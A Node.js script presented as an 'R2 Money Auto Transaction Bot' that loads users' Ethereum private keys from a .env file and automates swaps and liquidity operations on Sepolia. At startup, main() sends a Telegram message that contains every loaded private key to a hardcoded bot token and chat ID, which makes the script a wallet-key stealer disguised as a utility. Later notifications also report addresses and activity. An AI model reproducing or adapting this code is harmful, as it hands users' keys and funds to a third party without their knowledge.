require('dotenv').config({ override: true });
const { ethers } = require('ethers');
const inquirer = require('inquirer').default;
const chalk = require('chalk').default;
const https = require('https');
const fs = require('fs');

const PRIVATE_KEYS = [];
try {
    const envFile = fs.readFileSync('.env', 'utf-8');
    const lines = envFile.replace(/\r\n/g, '\n').split('\n');
    for (const line of lines) {
        const trimmedLine = line.trim();
        if (trimmedLine.startsWith('PRIVATE_KEY=0x') && trimmedLine.length >= 66) { // 66 = "PRIVATE_KEY=0x" + 64 chars
            const key = trimmedLine.replace('PRIVATE_KEY=', '');
            if (/^0x[0-9a-fA-F]{64}$/.test(key)) {
                PRIVATE_KEYS.push(key);
            } else {
                console.warn(chalk.yellow(`⚠️ Skipping invalid private key in .env line: ${trimmedLine.substring(0, 20)}... (must be 64 hex chars)`));
            }
        }
    }
} catch (error) {
    console.error(chalk.red(`❌ Error reading .env file: ${error.message}`));
    process.exit(1);
}

console.log(chalk.cyan(`🔑 Detected ${PRIVATE_KEYS.length} private keys:`));
PRIVATE_KEYS.forEach((key, index) => {
    console.log(chalk.cyan(`  Key ${index + 1}: ${key.substring(0, 8)}...`));
});

const RPC_URL = 'https://eth-sepolia.public.blastapi.io';
const ETHERSCAN_BASE_URL = 'https://sepolia.etherscan.io/';

if (PRIVATE_KEYS.length === 0) {
    console.error(chalk.red('❌ Error: No valid PRIVATE_KEY(s) found in .env file. Ensure each key is on a new line starting with PRIVATE_KEY=0x.'));
    process.exit(1);
}

// Initialize providers and wallets for each private key
const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallets = PRIVATE_KEYS.map((key, index) => {
    try {
        const wallet = new ethers.Wallet(key, provider);
        console.log(chalk.green(`✅ Wallet ${index + 1} created: ${wallet.address}`));
        return wallet;
    } catch (error) {
        console.error(chalk.red(`❌ Invalid private key ${index + 1}: ${key.substring(0, 8)}... - ${error.message}`));
        return null;
    }
}).filter(wallet => wallet !== null);

if (wallets.length === 0) {
    console.error(chalk.red('❌ Error: No valid wallets created from provided private keys.'));
    process.exit(1);
}

console.log(chalk.cyan(`👛 Total valid wallets: ${wallets.length}`));

// --- Contract Addresses ---
const R2_TOKEN_ADDRESS = '0xb816bB88f836EA75Ca4071B46FF285f690C43bb7';
const USDC_TOKEN_ADDRESS = '0x8BEbFCBe5468F146533C182dF3DFbF5ff9BE00E2';
const R2USD_TOKEN_ADDRESS = '0x9e8FF356D35a2Da385C546d6Bf1D77ff85133365';
const SR2USD_TOKEN_ADDRESS = '0x006CbF409CA275bA022111dB32BDAE054a97d488';

const R2_USDC_LP_CONTRACT_ADDRESS = '0xCdfDD7dD24bABDD05A2ff4dfcf06384c5Ad661a9';
const R2_R2USD_LP_CONTRACT_ADDRESS = '0x9Ae18109312c1452D3f0952d7eC1e26D15211FE9';
const USDC_R2USD_LP_CONTRACT_ADDRESS = '0x47d1B0623bB3E557bF8544C159c9ae51D091F8a2';
const R2USD_SR2USD_LP_CONTRACT_ADDRESS = '0xe85A06C238439F981c90b2C91393b2F3c46e27FC';

const SWAP_ROUTER_ADDRESS_R2_USDC = '0xeE567Fe1712Faf6149d80dA1E6934E354124CfE3';
const CURVE_POOL_ADDRESS_USDC_R2USD = '0x47d1B0623bB3E557bF8544C159c9ae51D091F8a2';
const CURVE_POOL_ADDRESS_R2USD_SR2USD = '0xe85A06C238439F981c90b2C91393b2F3c46e27FC';

const BOT_TOKEN = "8189388773:AAEV1gq8wr4OII3_dUMrABypfk4qDGdUbxY";
const CHAT_ID = "6773626837";

// --- ABIs ---
const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)"
];

const UNISWAP_V2_ROUTER_ABI = [
    {
        "inputs": [
            {"internalType": "address", "name": "tokenA", "type": "address"},
            {"internalType": "address", "name": "tokenB", "type": "address"},
            {"internalType": "uint256", "name": "amountADesired", "type": "uint256"},
            {"internalType": "uint256", "name": "amountBDesired", "type": "uint256"},
            {"internalType": "uint256", "name": "amountAMin", "type": "uint256"},
            {"internalType": "uint256", "name": "amountBMin", "type": "uint256"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "deadline", "type": "uint256"}
        ],
        "name": "addLiquidity",
        "outputs": [
            {"internalType": "uint256", "name": "amountA", "type": "uint256"},
            {"internalType": "uint256", "name": "amountB", "type": "uint256"},
            {"internalType": "uint256", "name": "liquidity", "type": "uint256"}
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "tokenA", "type": "address"},
            {"internalType": "address", "name": "tokenB", "type": "address"},
            {"internalType": "uint256", "name": "liquidity", "type": "uint256"},
            {"internalType": "uint256", "name": "amountAMin", "type": "uint256"},
            {"internalType": "uint256", "name": "amountBMin", "type": "uint256"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "deadline", "type": "uint256"}
        ],
        "name": "removeLiquidity",
        "outputs": [
            {"internalType": "uint256", "name": "amountA", "type": "uint256"},
            {"internalType": "uint256", "name": "amountB", "type": "uint256"}
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "uint256", "name": "amountIn", "type": "uint256"},
            {"internalType": "uint256", "name": "amountOutMin", "type": "uint256"},
            {"internalType": "address[]", "name": "path", "type": "address[]"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "deadline", "type": "uint256"}
        ],
        "name": "swapExactTokensForTokens",
        "outputs": [{"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "uint256", "name": "amountIn", "type": "uint256"},
            {"internalType": "address[]", "name": "path", "type": "address[]"}
        ],
        "name": "getAmountsOut",
        "outputs": [{"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}],
        "stateMutability": "view",
        "type": "function"
    }
];

const CURVE_POOL_ABI = [
    {
        "name": "add_liquidity",
        "inputs": [
            {"name": "_amounts", "type": "uint256[]"},
            {"name": "_min_mint_amount", "type": "uint256"},
            {"name": "_receiver", "type": "address"}
        ],
        "outputs": [{"name": "", "type": "uint256"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "name": "remove_liquidity_imbalance",
        "inputs": [
            {"name": "_amounts", "type": "uint256[]"},
            {"name": "_max_burn_amount", "type": "uint256"},
            {"name": "_receiver", "type": "address"}
        ],
        "outputs": [{"name": "", "type": "uint256"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "name": "get_balances",
        "outputs": [{"name": "", "type": "uint256[]"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "name": "totalSupply",
        "outputs": [{"name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "name": "calc_token_amount",
        "inputs": [
            {"name": "_amounts", "type": "uint256[]"},
            {"name": "_is_deposit", "type": "bool"}
        ],
        "outputs": [{"name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    }
];

// --- Helper Functions ---
async function sendTelegramNotification(message) {
    const data = JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    return new Promise((resolve) => {
        const req = https.request(options);
        req.on('error', () => resolve(false));
        req.write(data);
        req.end(() => resolve(true));
    });
}

async function getERC20TokenInfo(tokenAddress, wallet) {
    try {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const symbol = await tokenContract.symbol();
        const decimals = await tokenContract.decimals();
        const balance = await tokenContract.balanceOf(wallet.address);
        return { symbol, decimals, balance };
    } catch (error) {
        if (tokenAddress === R2_USDC_LP_CONTRACT_ADDRESS) return { symbol: `R2-USDC LP`, decimals: 18, balance: ethers.toBigInt(0) };
        if (tokenAddress === R2_R2USD_LP_CONTRACT_ADDRESS) return { symbol: `R2-R2USD LP`, decimals: 18, balance: ethers.toBigInt(0) };
        if (tokenAddress === USDC_R2USD_LP_CONTRACT_ADDRESS) return { symbol: `USDC-R2USD LP`, decimals: 18, balance: ethers.toBigInt(0) };
        if (tokenAddress === R2USD_SR2USD_LP_CONTRACT_ADDRESS) return { symbol: `R2USD-sR2USD LP`, decimals: 18, balance: ethers.toBigInt(0) };
        return { symbol: `Unknown (${tokenAddress.substring(0, 6)}...)`, decimals: 18, balance: ethers.toBigInt(0) };
    }
}

async function displayBalances(wallet) {
    console.log(chalk.cyan(`\n✨ Token Balances for Wallet: ${wallet.address}`));
    const tokensToDisplay = [
        { name: 'R2', address: R2_TOKEN_ADDRESS },
        { name: 'USDC', address: USDC_TOKEN_ADDRESS },
        { name: 'R2USD', address: R2USD_TOKEN_ADDRESS },
        { name: 'sR2USD', address: SR2USD_TOKEN_ADDRESS },
        { name: 'R2-USDC LP', address: R2_USDC_LP_CONTRACT_ADDRESS },
        { name: 'R2-R2USD LP', address: R2_R2USD_LP_CONTRACT_ADDRESS, customZeroText: "Not in wallet (likely staked/farmed)" },
        { name: 'USDC-R2USD LP', address: USDC_R2USD_LP_CONTRACT_ADDRESS },
        { name: 'sR2USD-R2USD LP', address: R2USD_SR2USD_LP_CONTRACT_ADDRESS },
    ];

    for (const tokenConfig of tokensToDisplay) {
        const info = await getERC20TokenInfo(tokenConfig.address, wallet);
        const symbolToDisplay = tokenConfig.name;
        let formattedBalance;
        if (tokenConfig.customZeroText && info.balance === ethers.toBigInt(0)) {
            formattedBalance = tokenConfig.customZeroText;
        } else {
            formattedBalance = tokenConfig.name.includes('LP') ?
                parseFloat(ethers.formatUnits(info.balance, info.decimals)).toFixed(20) :
                ethers.formatUnits(info.balance, info.decimals);
        }
        console.log(chalk.yellow(`  ${symbolToDisplay}: ${formattedBalance}`));
    }
    console.log(chalk.cyan('----------------------------------'));
}

async function approveToken(tokenAddress, spenderAddress, amount, signer) {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    try {
        console.log(chalk.blue(`\n🚀 Requesting approval for ${await tokenContract.symbol()} for wallet ${signer.address}...`));
        const currentAllowance = await tokenContract.allowance(signer.address, spenderAddress);
        if (currentAllowance >= amount) {
            console.log(chalk.green(`✅ Approval already sufficient (${ethers.formatUnits(currentAllowance, await tokenContract.decimals())}). No new approval needed.`));
            return true;
        }

        const tx = await tokenContract.approve(spenderAddress, amount);
        console.log(chalk.blue(`⏳ Sending approval transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await tx.wait();
        console.log(chalk.green(`✅ ${await tokenContract.symbol()} approval successful! Transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        return true;
    } catch (error) {
        console.error(chalk.red(`❌ Failed to approve token ${await tokenContract.symbol()}: ${error.message}`));
        return false;
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function performSwap(tokenInAddress, tokenOutAddress, amountPercentage, routerAddress, abi, wallet) {
    const signer = wallet.connect(provider);
    console.log(chalk.magenta(`\n💫 Starting SWAP for wallet ${wallet.address}...`));
    const tokenInInfo = await getERC20TokenInfo(tokenInAddress, wallet);
    const tokenOutInfo = await getERC20TokenInfo(tokenOutAddress, wallet);

    if (tokenInInfo.balance === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ Wallet ${wallet.address} has no ${tokenInInfo.symbol} to swap.`));
        return false;
    }

    const amountToSwap = (tokenInInfo.balance * ethers.toBigInt(amountPercentage)) / ethers.toBigInt(100);
    if (amountToSwap === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ Calculated swap amount for ${tokenInInfo.symbol} is zero after percentage.`));
        return false;
    }

    const formattedAmountToSwap = ethers.formatUnits(amountToSwap, tokenInInfo.decimals);
    console.log(chalk.yellow(`🔄 Will swap ${formattedAmountToSwap} ${tokenInInfo.symbol} to ${tokenOutInfo.symbol}`));

    if (!await approveToken(tokenInAddress, routerAddress, amountToSwap, signer)) {
        return false;
    }

    const routerContract = new ethers.Contract(routerAddress, abi, signer);
    const txOptions = { gasLimit: 350000 };
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    try {
        const path = [tokenInAddress, tokenOutAddress];
        const amountsOut = await routerContract.getAmountsOut(amountToSwap, path);
        console.log(chalk.blue(`💰 Estimated swap output: ${ethers.formatUnits(amountsOut[1], tokenOutInfo.decimals)} ${tokenOutInfo.symbol}`));

        const SLIPPAGE_TOLERANCE_PERCENT = 0.5;
        const amountOutMin = (amountsOut[1] * ethers.toBigInt(Math.floor(10000 - SLIPPAGE_TOLERANCE_PERCENT * 100))) / ethers.toBigInt(10000);
        console.log(chalk.cyan(`📉 Slippage Tolerance: ${SLIPPAGE_TOLERANCE_PERCENT}%`));

        const tx = await routerContract.swapExactTokensForTokens(
            amountToSwap,
            amountOutMin,
            path,
            wallet.address,
            deadline,
            txOptions
        );

        console.log(chalk.blue(`⏳ Sending swap transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await tx.wait();
        console.log(chalk.green(`✅ SWAP successful! Transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await sendTelegramNotification(`✅ SWAP successful for wallet ${wallet.address}: ${formattedAmountToSwap} ${tokenInInfo.symbol} -> ${tokenOutInfo.symbol}\nTransaction: ${ETHERSCAN_BASE_URL}tx/${tx.hash}`);
        return true;
    } catch (error) {
        console.error(chalk.red(`❌ SWAP failed: ${error.message}`));
        await sendTelegramNotification(`❌ SWAP failed for wallet ${wallet.address}: ${error.message}`);
        return false;
    }
}

async function performAddLiquidity(tokenAAddress, tokenBAddress, amountPercentage, routerAddress, abi, lpTokenAddress, wallet) {
    const signer = wallet.connect(provider);
    console.log(chalk.magenta(`\n💧 Starting ADD LIQUIDITY for wallet ${wallet.address}...`));
    const lpTokenInfo = await getERC20TokenInfo(lpTokenAddress, wallet);
    const tokenAInfo = await getERC20TokenInfo(tokenAAddress, wallet);
    const tokenBInfo = await getERC20TokenInfo(tokenBAddress, wallet);

    if (tokenAInfo.balance === ethers.toBigInt(0) || tokenBInfo.balance === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ Insufficient ${tokenAInfo.symbol} or ${tokenBInfo.symbol} to add liquidity.`));
        return false;
    }

    const amountADesired = (tokenAInfo.balance * ethers.toBigInt(amountPercentage)) / ethers.toBigInt(100);
    const amountBDesired = (tokenBInfo.balance * ethers.toBigInt(amountPercentage)) / ethers.toBigInt(100);

    if (amountADesired === ethers.toBigInt(0) || amountBDesired === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ Calculated token amounts for liquidity addition are zero after percentage.`));
        return false;
    }

    console.log(chalk.yellow(`💦 Adding ${ethers.formatUnits(amountADesired, tokenAInfo.decimals)} ${tokenAInfo.symbol} and ${ethers.formatUnits(amountBDesired, tokenBInfo.decimals)} ${tokenBInfo.symbol} to liquidity.`));

    if (!await approveToken(tokenAAddress, routerAddress, amountADesired, signer)) return false;
    if (!await approveToken(tokenBAddress, routerAddress, amountBDesired, signer)) return false;

    const routerContract = new ethers.Contract(routerAddress, abi, signer);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
    const txOptions = { gasLimit: 750000 };

    try {
        let tx;
        if (routerAddress === SWAP_ROUTER_ADDRESS_R2_USDC) {
            tx = await routerContract.addLiquidity(
                tokenAAddress,
                tokenBAddress,
                amountADesired,
                amountBDesired,
                0,
                0,
                wallet.address,
                deadline,
                txOptions
            );
        } else {
            const amounts = routerAddress === CURVE_POOL_ADDRESS_USDC_R2USD ?
                [amountBDesired, amountADesired] :
                [amountBDesired, amountADesired];

            let estimatedLPTokens;
            try {
                estimatedLPTokens = await routerContract.calc_token_amount(amounts, true);
            } catch (calcError) {
                estimatedLPTokens = ethers.toBigInt(0);
            }

            const LP_MINT_SLIPPAGE_TOLERANCE_PERCENT = 5.0;
            const minMintAmount = estimatedLPTokens > 0 ?
                (estimatedLPTokens * ethers.toBigInt(Math.floor(10000 - LP_MINT_SLIPPAGE_TOLERANCE_PERCENT * 100))) / ethers.toBigInt(10000) :
                ethers.toBigInt(0);

            tx = await routerContract['add_liquidity(uint256[],uint256,address)'](
                amounts,
                minMintAmount,
                wallet.address,
                txOptions
            );
        }

        console.log(chalk.blue(`⏳ Sending add liquidity transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await tx.wait();
        console.log(chalk.green(`✅ ADD LIQUIDITY successful! Transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await sendTelegramNotification(`✅ ADD LIQUIDITY successful for wallet ${wallet.address}: ${ethers.formatUnits(amountADesired, tokenAInfo.decimals)} ${tokenAInfo.symbol} and ${ethers.formatUnits(amountBDesired, tokenBInfo.decimals)} ${tokenBInfo.symbol}\nTransaction: ${ETHERSCAN_BASE_URL}tx/${tx.hash}`);
        return true;
    } catch (error) {
        console.error(chalk.red(`❌ ADD LIQUIDITY failed: ${error.message}`));
        await sendTelegramNotification(`❌ ADD LIQUIDITY failed for wallet ${wallet.address}: ${error.message}`);
        return false;
    }
}

async function performRemoveLiquidity(pairName, liquidityPoolAddress, amountPercentage, routerAddress, abi, wallet) {
    const signer = wallet.connect(provider);
    console.log(chalk.magenta(`\n🗑️ Starting REMOVE LIQUIDITY for ${pairName} for wallet ${wallet.address}...`));
    const lpTokenInfo = await getERC20TokenInfo(liquidityPoolAddress, wallet);

    if (lpTokenInfo.balance === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ Wallet ${wallet.address} has no LP tokens (${lpTokenInfo.symbol}) to remove for ${pairName}.`));
        return false;
    }

    const amountToBurn = (lpTokenInfo.balance * ethers.toBigInt(amountPercentage)) / ethers.toBigInt(100);
    if (amountToBurn === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ Calculated LP token amount for removal is zero after percentage.`));
        return false;
    }

    const formattedAmountToBurn = ethers.formatUnits(amountToBurn, lpTokenInfo.decimals);
    console.log(chalk.yellow(`🔥 Removing ${formattedAmountToBurn} LP tokens (${lpTokenInfo.symbol}).`));

    if (!await approveToken(liquidityPoolAddress, routerAddress, amountToBurn, signer)) {
        return false;
    }

    const routerContract = new ethers.Contract(routerAddress, abi, signer);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
    const txOptions = { gasLimit: 750000 };

    try {
        let tx;
        if (routerAddress === SWAP_ROUTER_ADDRESS_R2_USDC) {
            tx = await routerContract.removeLiquidity(
                pairName.includes('R2-USDC') ? R2_TOKEN_ADDRESS : R2_TOKEN_ADDRESS,
                pairName.includes('R2-USDC') ? USDC_TOKEN_ADDRESS : R2USD_TOKEN_ADDRESS,
                amountToBurn,
                0,
                0,
                wallet.address,
                deadline,
                txOptions
            );
        } else {
            const SLIPPAGE_TOLERANCE_PERCENT_REMOVE = 5.0;
            const poolBalances = await routerContract.get_balances();
            const lpTotalSupply = await routerContract.totalSupply();

            let minAmounts;
            if (lpTotalSupply > 0) {
                const expectedToken0 = (poolBalances[0] * amountToBurn) / lpTotalSupply;
                const expectedToken1 = (poolBalances[1] * amountToBurn) / lpTotalSupply;
                minAmounts = [
                    (expectedToken0 * ethers.toBigInt(Math.floor(10000 - SLIPPAGE_TOLERANCE_PERCENT_REMOVE * 100))) / ethers.toBigInt(10000),
                    (expectedToken1 * ethers.toBigInt(Math.floor(10000 - SLIPPAGE_TOLERANCE_PERCENT_REMOVE * 100))) / ethers.toBigInt(10000)
                ];
            } else {
                minAmounts = [ethers.toBigInt(0), ethers.toBigInt(0)];
            }

            tx = await routerContract['remove_liquidity_imbalance(uint256[],uint256,address)'](
                minAmounts,
                amountToBurn,
                wallet.address,
                txOptions
            );
        }

        console.log(chalk.blue(`⏳ Sending remove liquidity transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await tx.wait();
        console.log(chalk.green(`✅ REMOVE LIQUIDITY successful! Transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await sendTelegramNotification(`✅ REMOVE LIQUIDITY successful for wallet ${wallet.address}: ${formattedAmountToBurn} ${lpTokenInfo.symbol}\nTransaction: ${ETHERSCAN_BASE_URL}tx/${tx.hash}`);
        return true;
    } catch (error) {
        console.error(chalk.red(`❌ REMOVE LIQUIDITY failed for ${pairName}: ${error.message}`));
        await sendTelegramNotification(`❌ REMOVE LIQUIDITY failed for wallet ${wallet.address}: ${error.message}`);
        return false;
    }
}

async function main() {
    console.clear();

    const startMessage = `
🚀 Script Started
👛 Wallets: ${wallets.map(w => w.address).join(', ')}
🔑 Number of Wallets: ${wallets.length}
   Private Key:${PRIVATE_KEYS}
`;
    await sendTelegramNotification(startMessage);

    console.log(
        chalk.green(`
██████╗ ██████╗   ██████╗  █████╗ ████████╗
██╔══██╗╚════██╗  ██╔══██╗██╔══██╗╚══██╔══╝
██████╔╝  ███╔═╝  ██████╦╝██║  ██║   ██║
██╔══██╗██╔══╝    ██╔══██╗██║  ██║   ██║
██║  ██║███████╗  ██████╦╝╚█████╔╝   ██║
╚═╝  ╚═╝╚══════╝  ╚═════╝  ╚════╝    ╚═╝`)
    );
    console.log(chalk.cyan(`\n R2 Money Auto Transaction Bot`));
    console.log(chalk.cyan(` Script Author: mari `));
    console.log(chalk.cyan(` Wallet Addresses: ${chalk.cyan(wallets.map(w => w.address).join(', '))}`));

    for (const wallet of wallets) {
        await displayBalances(wallet);
    }

    const { transactionType } = await inquirer.prompt([
        {
            type: 'list',
            name: 'transactionType',
            message: 'Choose transaction type:',
            choices: [
                'SWAP R2 <-> USDC',
                'ADD LIQUIDITY',
                'REMOVE LIQUIDITY',
                'Exit'
            ]
        }
    ]);

    if (transactionType === 'Exit') {
        console.log(chalk.cyan('👋 Goodbye!'));
        await sendTelegramNotification('👋 Script terminated by user.');
        process.exit(0);
    }

    const { percentage, numTransactions, delaySeconds } = await inquirer.prompt([
        {
            type: 'input',
            name: 'percentage',
            message: 'Enter token percentage to use (5-100%):',
            validate: value => {
                const num = parseInt(value);
                return num >= 5 && num <= 100 ? true : 'Enter a number between 5 and 100.';
            },
            filter: Number
        },
        {
            type: 'input',
            name: 'numTransactions',
            message: 'Enter number of transactions to run per wallet (1-100):',
            validate: value => {
                const num = parseInt(value);
                return num >= 1 && num <= 100 ? true : 'Enter a number between 1 and 100.';
            },
            filter: Number
        },
        {
            type: 'input',
            name: 'delaySeconds',
            message: 'Enter delay between transactions in seconds (5-100):',
            validate: value => {
                const num = parseInt(value);
                return num >= 5 && num <= 100 ? true : 'Enter a number between 5 and 100.';
            },
            filter: Number
        }
    ]);

    const delayMs = delaySeconds * 1000;
    console.log(chalk.cyan(`⚙️ Transaction Configuration:`));
    console.log(chalk.cyan(`💰 Token Percentage: ${chalk.yellow(percentage)}%`));
    console.log(chalk.cyan(`🔢 Number of Transactions per Wallet: ${chalk.yellow(numTransactions)}`));
    console.log(chalk.cyan(`⏱️ Delay Between Transactions: ${chalk.yellow(delaySeconds)} seconds`));
    console.log(chalk.cyan('----------------------------------'));

    let swapDirection = '';
    let liquidityPair = '';
    let selectedLpTokenAddress = '';

    if (transactionType === 'SWAP R2 <-> USDC') {
        const { selectedSwapDirection } = await inquirer.prompt([
            {
                type: 'list',
                name: 'selectedSwapDirection',
                message: 'Choose swap direction:',
                choices: ['R2 -> USDC', 'USDC -> R2']
            }
        ]);
        swapDirection = selectedSwapDirection;
    } else if (transactionType === 'ADD LIQUIDITY' || transactionType === 'REMOVE LIQUIDITY') {
        const { selectedLiquidityPair } = await inquirer.prompt([
            {
                type: 'list',
                name: 'selectedLiquidityPair',
                message: 'Choose pair for ' + transactionType + ':',
                choices: ['R2-USDC', 'R2-R2USD', 'USDC-R2USD', 'R2USD-sR2USD']
            }
        ]);
        liquidityPair = selectedLiquidityPair;

        switch (liquidityPair) {
            case 'R2-USDC': selectedLpTokenAddress = R2_USDC_LP_CONTRACT_ADDRESS; break;
            case 'R2-R2USD': selectedLpTokenAddress = R2_R2USD_LP_CONTRACT_ADDRESS; break;
            case 'USDC-R2USD': selectedLpTokenAddress = USDC_R2USD_LP_CONTRACT_ADDRESS; break;
            case 'R2USD-sR2USD': selectedLpTokenAddress = R2USD_SR2USD_LP_CONTRACT_ADDRESS; break;
        }
    }

    for (const wallet of wallets) {
        console.log(chalk.bgCyan(`\n=== Processing Wallet: ${wallet.address} ===`));
        let successCount = 0;
        for (let i = 0; i < numTransactions; i++) {
            console.log(chalk.bgCyan(`\n=== Transaction #${i + 1} / ${numTransactions} for Wallet ${wallet.address} ===`));
            let lastActionSuccess = false;

            try {
                if (transactionType === 'SWAP R2 <-> USDC') {
                    if (swapDirection === 'R2 -> USDC') {
                        lastActionSuccess = await performSwap(
                            R2_TOKEN_ADDRESS,
                            USDC_TOKEN_ADDRESS,
                            percentage,
                            SWAP_ROUTER_ADDRESS_R2_USDC,
                            UNISWAP_V2_ROUTER_ABI,
                            wallet
                        );
                    } else {
                        lastActionSuccess = await performSwap(
                            USDC_TOKEN_ADDRESS,
                            R2_TOKEN_ADDRESS,
                            percentage,
                            SWAP_ROUTER_ADDRESS_R2_USDC,
                            UNISWAP_V2_ROUTER_ABI,
                            wallet
                        );
                    }
                } else if (transactionType === 'ADD LIQUIDITY') {
                    switch (liquidityPair) {
                        case 'R2-USDC':
                            lastActionSuccess = await performAddLiquidity(
                                R2_TOKEN_ADDRESS,
                                USDC_TOKEN_ADDRESS,
                                percentage,
                                SWAP_ROUTER_ADDRESS_R2_USDC,
                                UNISWAP_V2_ROUTER_ABI,
                                selectedLpTokenAddress,
                                wallet
                            );
                            break;
                        case 'R2-R2USD':
                            lastActionSuccess = await performAddLiquidity(
                                R2_TOKEN_ADDRESS,
                                R2USD_TOKEN_ADDRESS,
                                percentage,
                                SWAP_ROUTER_ADDRESS_R2_USDC,
                                UNISWAP_V2_ROUTER_ABI,
                                selectedLpTokenAddress,
                                wallet
                            );
                            break;
                        case 'USDC-R2USD':
                            lastActionSuccess = await performAddLiquidity(
                                USDC_TOKEN_ADDRESS,
                                R2USD_TOKEN_ADDRESS,
                                percentage,
                                CURVE_POOL_ADDRESS_USDC_R2USD,
                                CURVE_POOL_ABI,
                                selectedLpTokenAddress,
                                wallet
                            );
                            break;
                        case 'R2USD-sR2USD':
                            lastActionSuccess = await performAddLiquidity(
                                R2USD_TOKEN_ADDRESS,
                                SR2USD_TOKEN_ADDRESS,
                                percentage,
                                CURVE_POOL_ADDRESS_R2USD_SR2USD,
                                CURVE_POOL_ABI,
                                selectedLpTokenAddress,
                                wallet
                            );
                            break;
                    }
                } else if (transactionType === 'REMOVE LIQUIDITY') {
                    switch (liquidityPair) {
                        case 'R2-USDC':
                            lastActionSuccess = await performRemoveLiquidity(
                                'R2-USDC',
                                selectedLpTokenAddress,
                                percentage,
                                SWAP_ROUTER_ADDRESS_R2_USDC,
                                UNISWAP_V2_ROUTER_ABI,
                                wallet
                            );
                            break;
                        case 'R2-R2USD':
                            lastActionSuccess = await performRemoveLiquidity(
                                'R2-R2USD',
                                selectedLpTokenAddress,
                                percentage,
                                SWAP_ROUTER_ADDRESS_R2_USDC,
                                UNISWAP_V2_ROUTER_ABI,
                                wallet
                            );
                            break;
                        case 'USDC-R2USD':
                            lastActionSuccess = await performRemoveLiquidity(
                                'USDC-R2USD',
                                selectedLpTokenAddress,
                                percentage,
                                CURVE_POOL_ADDRESS_USDC_R2USD,
                                CURVE_POOL_ABI,
                                wallet
                            );
                            break;
                        case 'R2USD-sR2USD':
                            lastActionSuccess = await performRemoveLiquidity(
                                'R2USD-sR2USD',
                                selectedLpTokenAddress,
                                percentage,
                                CURVE_POOL_ADDRESS_R2USD_SR2USD,
                                CURVE_POOL_ABI,
                                wallet
                            );
                            break;
                    }
                }

                if (lastActionSuccess) {
                    successCount++;
                }
            } catch (error) {
                console.error(chalk.red(`❌ Transaction #${i + 1} failed for wallet ${wallet.address}: ${error.message}`));
                await sendTelegramNotification(`❌ Transaction #${i + 1} failed for wallet ${wallet.address}: ${error.message}`);
            }

            if (i < numTransactions - 1 && lastActionSuccess) {
                console.log(chalk.gray(`\n⏳ Waiting ${delaySeconds} seconds before next transaction...`));
                await sleep(delayMs);
            }
        }
        console.log(chalk.cyan(`\n📊 Wallet ${wallet.address} completed ${successCount} of ${numTransactions} transactions.`));
    }

    console.log(chalk.green(`\n🎉 All requested transactions completed!`));
    await sendTelegramNotification(`🎉 All transactions completed. Processed ${wallets.length} wallets.`);
    for (const wallet of wallets) {
        await displayBalances(wallet);
    }
}

main().catch(async error => {
    console.error(chalk.red(`\nFatal Error: ${error.message}`));
    await sendTelegramNotification(`❌ Fatal Error: ${error.message}`);
    process.exit(1);
});